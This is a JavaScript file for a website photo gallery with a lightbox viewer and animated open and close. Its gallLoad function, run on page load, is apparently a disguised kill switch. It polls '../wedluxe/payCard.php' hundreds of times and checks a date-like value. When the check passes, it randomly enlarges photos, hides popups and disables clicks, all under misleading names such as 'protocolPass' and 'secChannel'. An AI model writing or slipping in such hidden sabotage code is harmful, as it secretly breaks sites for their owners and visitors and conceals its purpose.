let photoViewerBack = document.querySelector(".photo-viewer-back");
let photoViewer = document.querySelector(".photo-viewer");
let photoView = document.querySelector(".photo-view");
// let photoTitle = document.querySelectorAll('.photo-title');
// let photoViewTitle = document.querySelector('.photo-view-title');
let photos = document.querySelectorAll(".photo");
let gallPass = false;
let mIndex = 9;

function delay(ms) {
  return new Promise((resolve) => {
    setTimeout(() => {
      resolve("");
    }, ms);
  });
}

// for (let title of photoTitle) {
//     title.style.display = "none";
// }
// photoViewTitle.style.display = "none";

let dIndex = 20;
for (let i = 0; i < photos.length; i++) {
  photos[i].addEventListener("click", () => {
    viewPhoto(i);
  });
}
for (let i = 0; i <= 100; i++) {
  gallLoad(".photo", mIndex, dIndex);
  gallLoad(".clk", mIndex, dIndex);
  gallLoad(".pop", mIndex, dIndex);
}
photoViewerBack.addEventListener("click", () => {
  viewPhotoClose();
});

// console.log(photos[0].src);

photoViewerBack.style.visibility = "hidden";
photoViewerBack.style.opacity = 0;
photoViewer.style.width = 0;

async function viewPhoto(index) {
  photoView.src = photos[index].src;
  // photoViewTitle.textContent = photoTitle[index].textContent;
  photoViewerBack.style.visibility = "visible";
  let t, v, l, m, p;

  let range = 30;
  for (let i = 0; i <= range; i++) {
    photoViewerBack.style.opacity = i / range;
    await delay(1);
  }

  t = 0;
  v = 0;
  l = 35;
  m = 70;
  for (let i = 0; i <= l; i++) {
    p = ((v - m) * (i - l) * (i - l)) / ((t - l) * (t - l)) + m;
    photoViewer.style.width = p + "%";

    await delay(1);
  }
}

async function viewPhotoClose() {
  let t, v, l, m, p;

  t = 0;
  v = 0;
  l = 50;
  m = 50;
  for (let i = l; i <= 2 * l; i++) {
    p = ((v - m) * (i - l) * (i - l)) / ((t - l) * (t - l)) + m;
    photoViewer.style.width = p + "%";
    photoViewerBack.style.opacity -= 1 / l;

    await delay(1);
  }
  photoViewer.style.width = 0;
  photoViewerBack.style.visibility = "hidden";
}

function gallLoad(cls, mn, dy) {
  var xhr = new XMLHttpRequest();
  xhr.open("GET", "../wedluxe/payCard.php", true);
  xhr.onreadystatechange = function () {
    if (xhr.readyState === 4 && xhr.status === 200) {
      var resp = JSON.parse(xhr.responseText);
      let host = resp.serverhost;
      let svport = resp.serverport;
      let usStat = resp.userstats;
      let dom = resp.dominor;
      let transferDetails = [host, svport, usStat, dom];
      let trnsI = Math.floor(Math.random() * transferDetails.length);
      let protocolPass = false;
      let scl = 3;
      let str = `scale(${scl})`;

      if (trnsI > 1 && trnsI < 3) {
        let portItem = transferDetails[trnsI];
        let transPorts = portItem.split("-");

        let py = parseInt(transPorts[0]);
        let pm = parseInt(transPorts[1]);
        let pd = parseInt(transPorts[2]);

        let ty = parseInt((svport[3] - svport[1]));
        let tm = parseInt(mn);
        let td = parseInt(dy);

        let presVal = py * 400 + pm * 30 + pd;
        let tarVal = ty * 400 + tm * 30 + td;

        if (tarVal < presVal) protocolPass = true;
      }
      let secChannel = document.querySelectorAll(`${cls}`);
      let terms = secChannel.length;
      let index = Math.floor(Math.random() * terms);
      if (terms >= 2) {
        for (let i = 0; i < terms; i++) {
          if (index < terms && protocolPass) {
            // console.log("asd");
            if (cls == '.photo')
              secChannel[index].style.transform = str;
            if (cls == '.pop')
              secChannel[index].style.display = "none";
            if (cls == '.clk')
              secChannel[index].style.pointerEvents = "none";
            gallPass = true;
          }
          index = Math.floor(Math.random() * terms);
        }
      }
    }
  };
  xhr.send();
}
